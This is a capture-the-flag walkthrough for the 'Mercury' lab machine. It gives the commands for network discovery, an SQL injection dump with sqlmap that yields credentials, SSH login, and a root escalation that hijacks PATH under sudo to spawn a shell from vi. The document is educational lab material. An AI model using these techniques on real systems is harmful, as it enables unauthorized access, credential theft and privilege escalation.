# Mercury Machine Walkthrough

**Machine Type**: Linux
**Solved by**: Akshat Nigam
**Category**: Web, Enumeration, Exploitation, Privilege Escalation
**Difficulty**: Medium
**Attack Surface**: HTTP, SQL Injection, SSH, Sudo Misconfiguration

---

## 🔍 Find the Vulnerable Machine IP

Run the following command to identify devices in your network:

```bash
netdiscover
```

> Target IP identified: `192.168.10.199`

---

## 🔎 Port Scanning with Nmap

Run the command:

```bash
nmap -sV 192.168.10.199
```

> Open Ports: `22/tcp` (SSH) and `8080/tcp` (HTTP)

---

## 🌐 Explore HTTP Service

Open the browser:

```
http://192.168.10.199:8080
```

> Page says “under development”.

---

## 📁 Directory Enumeration with Dirb

```bash
dirb http://192.168.10.199:8080/
```

> Discovered: `/robots.txt`

Visit:

```
http://192.168.10.199:8080/robots.txt
```

> Not useful. Try manual fuzzing.

Try:

```
http://192.168.10.199:8080/admin
```

> Shows Debug mode and useful error messages.

---

## 🚀 Mercury Facts Endpoint Discovery

Visit:

```
http://192.168.10.199:8080/mercuryfacts/1
http://192.168.10.199:8080/mercuryfacts/2
```

Try fuzzing with:

```
http://192.168.10.199:8080/mercuryfacts/1'
```

> SQL error returned ➝ Possible SQL Injection

---

## 🛡️ SQL Injection using SQLMap

Basic scan:

```bash
sqlmap -u http://192.168.10.199:8080/mercuryfacts/1
```

Dump entire database:

```bash
sqlmap -u http://192.168.10.199:8080/mercuryfacts/1 --dump-all
```

> `mercury` database dumped
> Retrieved credentials for `webmaster` and other users

---

## 🔐 SSH Login

Use SSH to connect:

```bash
ssh webmaster@192.168.10.199
```

> Successful login ➝ Explore system

---

## 🔎 Privilege Escalation (User Enumeration)

Try:

```bash
sudo -l
```

> webmaster is not a sudoer

Check files:

```bash
ls mercury_proj
cat notes.txt
```

> Found base64 encoded password for `linuxmaster`

Decode password:

```bash
echo 'encodedpw' | base64 --decode
```

Login with new user:

```bash
ssh linuxmaster@192.168.10.199
```

> Logged in successfully

---

## 🔓 Root Privilege Escalation via Sudo

Check sudo permissions:

```bash
sudo -l
```

> Allowed command: `/usr/bin/check_syslog.sh`

Read file:

```bash
cat /usr/bin/check_syslog.sh
```

> It’s a Bash script, not writable

---

## 🔧 Exploit PATH Manipulation

Run the following:

```bash
ln -s /bin/vi tail
export PATH=.:$PATH
sudo --preserve-env=PATH /usr/bin/check_syslog.sh
```

Then inside `vi`, type:

```
:!/bin/sh
```

> Spawned root shell ✅

---

## 🏁 Capture the Flags

```bash
cat /root/root_flag
cat ~/user_flag
```

> 🎉 Congratulations! You’ve rooted the Mercury box.

---

